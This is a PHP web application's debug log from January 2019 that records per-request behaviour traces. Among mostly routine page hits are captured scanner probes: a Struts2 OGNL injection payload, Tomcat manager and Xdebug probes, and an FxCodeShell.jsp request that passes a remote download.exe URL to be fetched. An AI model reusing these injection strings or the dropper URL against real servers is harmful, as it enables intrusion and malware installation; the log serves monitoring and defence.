[ 2019-01-30T00:02:35+08:00 ] 31.207.241.120 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000428s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000367s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000864s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000925s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000975s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000054s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000103s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.009407s ]
INFO: [ view_parse ] --END-- [ RunTime:0.009492s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000171s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000404s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000632s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000330s ]
INFO: [ app_end ] --END-- [ RunTime:0.000360s ]

[ 2019-01-30T01:30:58+08:00 ] 94.191.12.189 /FxCodeShell.jsp%20
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000070s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000450s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000458s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000991s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.001004s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001101s ]
ERR: 模板不存在:./Application/Home/View/view4/Index/sls.html

[ 2019-01-30T01:30:58+08:00 ] 94.191.12.189 /FxCodeShell.jsp::$DATA
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000059s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000328s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000365s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000752s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000786s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000825s ]
ERR: 模板不存在:./Application/Home/View/view4/Index/sls.html

[ 2019-01-30T01:30:58+08:00 ] 94.191.12.189 /FxCodeShell.jsp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000059s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000348s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000389s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000801s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000787s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000826s ]
ERR: 模板不存在:./Application/Home/View/view4/Index/sls.html

[ 2019-01-30T01:30:58+08:00 ] 94.191.12.189 /FxCodeShell.jsp?wiew=FxxkMyLie1836710Aa&os=1&address=http://a46.bulehero.in/download.exe
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000460s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000524s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001061s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000996s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001051s ]
ERR: 模板不存在:./Application/Home/View/view4/Index/sls.html

[ 2019-01-30T01:40:07+08:00 ] 189.91.80.82 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000067s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000484s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000619s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001195s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.001133s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001228s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000064s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000124s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.015320s ]
INFO: [ view_parse ] --END-- [ RunTime:0.015382s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000143s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000386s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000608s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000445s ]
INFO: [ app_end ] --END-- [ RunTime:0.000483s ]

[ 2019-01-30T02:01:46+08:00 ] 95.19.88.145 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000052s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000341s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000302s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000699s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000716s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000752s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000076s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000158s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010098s ]
INFO: [ view_parse ] --END-- [ RunTime:0.010141s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000132s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000318s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000500s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000476s ]
INFO: [ app_end ] --END-- [ RunTime:0.000515s ]

[ 2019-01-30T02:12:07+08:00 ] 86.60.128.167 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000054s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000338s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000306s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000724s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000839s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000887s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000062s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000122s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.009703s ]
INFO: [ view_parse ] --END-- [ RunTime:0.009767s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000159s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000320s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000529s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000438s ]
INFO: [ app_end ] --END-- [ RunTime:0.000470s ]

[ 2019-01-30T02:16:21+08:00 ] 113.193.176.35 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000069s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000587s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000427s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001106s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000904s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000969s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000062s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000122s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010894s ]
INFO: [ view_parse ] --END-- [ RunTime:0.010958s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000180s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000401s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000636s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000363s ]
INFO: [ app_end ] --END-- [ RunTime:0.000393s ]

[ 2019-01-30T02:50:53+08:00 ] 165.255.133.204 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000076s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001397s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.002173s ]
INFO: [ app_begin ] --END-- [ RunTime:0.003664s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.010191s ]
INFO: [ action_begin ] --END-- [ RunTime:0.010328s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000053s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000101s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.037795s ]
INFO: [ view_parse ] --END-- [ RunTime:0.037862s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001096s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.001185s ]
INFO: [ view_filter ] --END-- [ RunTime:0.002359s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001325s ]
INFO: [ app_end ] --END-- [ RunTime:0.001367s ]

[ 2019-01-30T03:03:08+08:00 ] 177.130.244.70 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000336s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000348s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000743s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000881s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000937s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000054s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000107s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.012123s ]
INFO: [ view_parse ] --END-- [ RunTime:0.012187s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000152s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000449s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000670s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000337s ]
INFO: [ app_end ] --END-- [ RunTime:0.000366s ]

[ 2019-01-30T03:18:01+08:00 ] 59.36.119.226 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: [ app_init ] --END-- [ RunTime:0.000102s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000715s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000641s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001461s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000747s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000790s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000077s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000131s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.009524s ]
INFO: [ view_parse ] --END-- [ RunTime:0.009577s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000123s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000323s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000496s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000333s ]
INFO: [ app_end ] --END-- [ RunTime:0.000363s ]

[ 2019-01-30T03:24:21+08:00 ] 36.232.231.58 /manager/html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000051s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000377s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000333s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000775s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000829s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000883s ]
ERR: 模板不存在:./Application/Home/View/view4/Index/sls.html

[ 2019-01-30T03:37:20+08:00 ] 123.151.144.37 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000063s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000442s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001325s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001853s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.001982s ]
INFO: [ action_begin ] --END-- [ RunTime:0.002048s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000059s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000132s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.012876s ]
INFO: [ view_parse ] --END-- [ RunTime:0.012930s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000141s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000331s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000519s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000369s ]
INFO: [ app_end ] --END-- [ RunTime:0.000400s ]

[ 2019-01-30T03:37:20+08:00 ] 123.151.144.37 /999tst999
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000049s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000310s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000321s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000691s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.001051s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001121s ]
ERR: 模板不存在:./Application/Home/View/view4/Index/sls.html

[ 2019-01-30T03:45:04+08:00 ] 123.151.144.37 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000052s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000359s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000439s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000867s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000742s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000796s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000050s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000098s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.009800s ]
INFO: [ view_parse ] --END-- [ RunTime:0.009866s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000115s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000412s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000578s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000512s ]
INFO: [ app_end ] --END-- [ RunTime:0.000585s ]

[ 2019-01-30T03:45:04+08:00 ] 123.151.144.37 /999tst999
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000048s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000322s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000308s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000686s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.001124s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001203s ]
ERR: 模板不存在:./Application/Home/View/view4/Index/sls.html

[ 2019-01-30T03:59:12+08:00 ] 123.151.144.37 /?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000052s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000459s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000314s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000866s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000934s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000987s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000056s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000108s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.011086s ]
INFO: [ view_parse ] --END-- [ RunTime:0.011146s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000195s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000347s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000605s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000349s ]
INFO: [ app_end ] --END-- [ RunTime:0.000379s ]

[ 2019-01-30T03:59:12+08:00 ] 123.151.144.37 /999tst999?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000065s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000477s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000313s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000858s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000791s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000837s ]
ERR: 模板不存在:./Application/Home/View/view4/Index/sls.html

[ 2019-01-30T04:00:12+08:00 ] 123.151.144.37 /?XDEBUG_SESSION_START=phpstorm
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000054s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000557s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000491s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001152s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.001062s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001163s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000058s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000111s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010568s ]
INFO: [ view_parse ] --END-- [ RunTime:0.010614s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000137s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000321s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000507s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000331s ]
INFO: [ app_end ] --END-- [ RunTime:0.000361s ]

[ 2019-01-30T04:00:13+08:00 ] 123.151.144.37 /999tst999?XDEBUG_SESSION_START=phpstorm
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000065s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000536s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000442s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001102s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.001102s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001165s ]
ERR: 模板不存在:./Application/Home/View/view4/Index/sls.html

[ 2019-01-30T04:20:33+08:00 ] 177.152.82.190 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000054s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000399s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000307s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000790s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000972s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001028s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000068s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000129s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.011437s ]
INFO: [ view_parse ] --END-- [ RunTime:0.011501s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000128s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000300s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000477s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000369s ]
INFO: [ app_end ] --END-- [ RunTime:0.000403s ]

[ 2019-01-30T04:41:23+08:00 ] 177.190.176.92 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000050s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000447s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000490s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001018s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.002373s ]
INFO: [ action_begin ] --END-- [ RunTime:0.002614s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000058s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000120s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010633s ]
INFO: [ view_parse ] --END-- [ RunTime:0.010681s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000133s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000308s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000489s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000393s ]
INFO: [ app_end ] --END-- [ RunTime:0.000439s ]

[ 2019-01-30T04:43:17+08:00 ] 123.151.144.37 /
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000061s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000473s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000377s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000928s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000960s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001036s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000057s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000110s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010134s ]
INFO: [ view_parse ] --END-- [ RunTime:0.010202s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000181s ]
INFO: Run Behavior\TokenBuildBehavior [ RunTime:0.000312s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000544s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000657s ]
INFO: [ app_end ] --END-- [ RunTime:0.000712s ]

[ 2019-01-30T04:43:17+08:00 ] 123.151.144.37 /999tst999
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000050s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000356s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000352s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000789s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.001172s ]
INFO: [ action_begin ] --END-- [ RunTime:0.001233s ]
ERR: 模板不存在:./Application/Home/View/view4/Index/sls.html

[ 2019-01-30T04:53:53+08:00 ] 123.151.144.37 /index.html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000065s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000336s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000320s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000724s ]
INFO: [ action_begin ] --START--
INFO: Run Behavior\CheckAuthBehavior [ RunTime:0.000795s ]
INFO: [ action_begin ] --END-- [ RunTime:0.000834s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000065s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000143s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.011837s ]
